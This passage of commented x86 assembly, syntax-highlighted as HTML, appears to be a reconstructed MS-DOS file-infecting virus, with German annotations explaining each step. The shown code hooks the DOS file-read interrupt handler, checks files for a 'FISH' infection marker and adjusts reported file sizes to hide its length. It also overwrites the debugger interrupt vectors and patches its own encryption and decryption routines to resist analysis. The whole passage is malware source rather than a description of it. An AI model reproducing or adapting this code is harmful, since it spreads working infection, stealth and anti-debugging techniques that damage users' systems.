                                        </span><span class="sc1">; CX = 0020</span><span class="sc0">
                                        </span><span class="sc1">; DX = A5C0</span><span class="sc0">
                                        </span><span class="sc1">; DS = 0000</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J02AD2</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                                        </span><span class="sc1">; 2F3A auf Stack als ret-adr</span><span class="sc0">
                </span><span class="sc1">;------&gt;(J02EC8)----[keine RÅckkehr vom CALL ! ]------</span><span class="sc0">
                </span><span class="sc1">;-----------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9H</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( no entry...)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">0EBH</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J035E3</span><span class="sc0">          </span><span class="sc1">; Erzeugt eine 7 Byte-Tabelle und checkt</span><span class="sc0">
                                </span><span class="sc1">; Verfallsdatum</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( no entry...)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02F41</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J02F43</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02F0B</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02FA2</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">1Ch</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">57h</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================( zum Handler fÅr Read Seq. FCB.AH=14)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02F55</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">27</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; CALL INT 21h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">08</span><span class="sc4">],</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">-</span><span class="sc2">04</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GetDTA</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">27</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02FF6</span><span class="sc0">
</span><span class="sc1">;==========================================( check auf infektion )===</span><span class="sc0">
</span><span class="sc5">J02F7A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc0">    </span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">5348h</span><span class="sc0">        </span><span class="sc1">; 'SH'  --&gt; 'FISH' !</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">4649h</span><span class="sc0">        </span><span class="sc1">; 'FI'</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">28</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02FF6</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,+</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">          </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;=================================================================</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc1">;=================================================================</span><span class="sc0">
</span><span class="sc5">J02FA0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02F33</span><span class="sc0">
</span><span class="sc1">;=================================================================</span><span class="sc0">
</span><span class="sc5">J02FA2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                  </span><span class="sc1">;?????!??????!????</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02FC0</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">J02FC0</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J02FA0</span><span class="sc0">          </span><span class="sc1">; JMP J02F33, if CX &lt;&gt; 0</span><span class="sc0">
                                        </span><span class="sc1">; ist identisch mit</span><span class="sc0">
                                        </span><span class="sc1">; "JMP J02FC0"....</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02FCB</span><span class="sc0">          </span><span class="sc1">; -&gt; J03251 -&gt; J034D4</span><span class="sc0">


</span><span class="sc5">J02FC0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">@0478</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J02AD2</span><span class="sc0">          </span><span class="sc1">; -&gt;keine RÅckkehr vom CALL !&lt;-</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0E9H</span><span class="sc4">,</span><span class="sc2">0A8h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">J02FCB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J03251</span><span class="sc0">          </span><span class="sc1">; -&gt; 34d4</span><span class="sc0">
</span><span class="sc1">;=====================( no entry )==( muss (!) ausgefÅhrt werden )===</span><span class="sc0">
</span><span class="sc5">J02FCE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">SwapCode_5</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">
                                        </span><span class="sc1">; Adresse J03259</span><span class="sc0">
                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Ist am anfang immer 20h</span><span class="sc0">
                                        </span><span class="sc1">; also wird 32 Mal diese Schleife</span><span class="sc0">
                                        </span><span class="sc1">; ausgefÅhrt und versucht, den</span><span class="sc0">
                                        </span><span class="sc1">; INT 1 zu setzen.....</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J02FCB</span><span class="sc0">          </span><span class="sc1">; Zur Arbeit !</span><span class="sc0">
                </span><span class="sc1">;---------------------------------------------------</span><span class="sc0">
                </span><span class="sc1">; INT 1 und INT 3 zerstîren.</span><span class="sc0">
                </span><span class="sc1">;---------------------------------------------------</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0004h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">Word</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">000Ch</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02D00</span><span class="sc0">                  </span><span class="sc1">; schlechter Pfad !</span><span class="sc0">
</span><span class="sc1">;========================================================( trash )===</span><span class="sc0">
</span><span class="sc5">J02FEA</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">0f4h</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================( zum Handler fÅr Read Seq. FCB.AH=14)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J02FF6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc5">MDECODE</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0025h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@FCB</span><span class="sc0">  </span><span class="sc1">; Kopiere FCB</span><span class="sc0">
                </span><span class="sc6">REPZ</span><span class="sc0">    </span><span class="sc6">MOVSB</span><span class="sc0">
   
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">@FCB</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; HOLE FILESIZE nach DX:AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">Code_Len</span><span class="sc4">+</span><span class="sc2">0FH</span><span class="sc0"> </span><span class="sc1">; ADD filesize, 240fh</span><span class="sc0">
                </span><span class="sc6">ADC</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0FFF0h</span><span class="sc0">       </span><span class="sc1">; Filesize auf (mod 16) normieren</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
</span><span class="sc5">J03020</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; und zurueck</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">Code_Len</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; 23fc abziehen</span><span class="sc0">
                </span><span class="sc6">SBB</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,+</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">23h</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">     </span><span class="sc1">; und nach RandomRec kopieren ?!?</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">21h</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">     </span><span class="sc1">; Dadurch wird das FILE in</span><span class="sc0">
                                        </span><span class="sc1">; einem Record gelesen ( aber nur,</span><span class="sc0">
                                        </span><span class="sc1">; wenn's kleiner als 1 Segment ist)</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">001Ch</span><span class="sc0">        </span><span class="sc1">; Lese 1Ch byte (EXE-Header)</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">27h</span><span class="sc0">          </span><span class="sc1">; READ RANDOM BLOCK FCB</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc5">MCODE</span><span class="sc0">   </span><span class="sc2">29</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J02EA3</span><span class="sc0">          </span><span class="sc1">; fertig</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;================================================( AUS DEM HIER : )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">J03047</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">03BH</span><span class="sc4">,</span><span class="sc2">0DEH</span><span class="sc0">       </span><span class="sc1">; CMP     BX,SI</span><span class="sc0">
        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">0D5H</span><span class="sc0">       </span><span class="sc1">; JZ      J03020</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;===============================================( Wird DAS HIER : )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
        </span><span class="sc1">;J03047:XOR     WORD PTR CS:[SI],BX</span><span class="sc0">
        </span><span class="sc1">;       NOP</span><span class="sc0">
        </span><span class="sc1">;       RET</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;============================================(  DER CODE-PATCHER  )===</span><span class="sc0">
</span><span class="sc1">;============================================( SI kommt mit 210Ah )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">PATCH</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0492F</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0491A</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">157Dh</span><span class="sc0">        </span><span class="sc1">; SI = 211F / 492F</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; SI = 2121 / 4931</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">758Bh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; SI = 2123 / 4933</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0081h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">08h</span><span class="sc0">         </span><span class="sc1">; SI = 212B / 493B</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0A08h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; SI = 212D / 493D</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">302Fh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; SI = 212f / 493F</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">02A5h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">
                </span><span class="sc1">;----------------------( DECODE ist jetzt 'anders')---</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J0499D</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J04941</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">157Dh</span><span class="sc0">        </span><span class="sc1">; SI = 218D / 499D</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">05h</span><span class="sc0">         </span><span class="sc1">; SI = 2192 / 49A2</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0A09Fh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">0Ah</span><span class="sc0">         </span><span class="sc1">; SI = 219C / 49AC</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">00A7h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">0Ch</span><span class="sc0">         </span><span class="sc1">; SI = 21A8 / 49B8</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">872Dh</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; SI = 21AA / 49BA</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">7829h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; SI = 21AC / 49BC</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">4229h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">         </span><span class="sc1">; SI = 21AE / 49BE</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1AC0h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">
                </span><span class="sc1">;---------------( CODEIT ist jetzt auch 'anders' )---</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J04A2A</span><span class="sc4">-</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J049C0</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                                        </span><span class="sc1">; SI = 221A / 4A2A</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">1114h</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J04A39</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J04A2A</span><span class="sc0">
                                        </span><span class="sc1">; SI = 2229 / 4A39</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">        </span><span class="sc1">; ? NOP ?</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J03047</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J04A44</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">J04A39</span><span class="sc0">
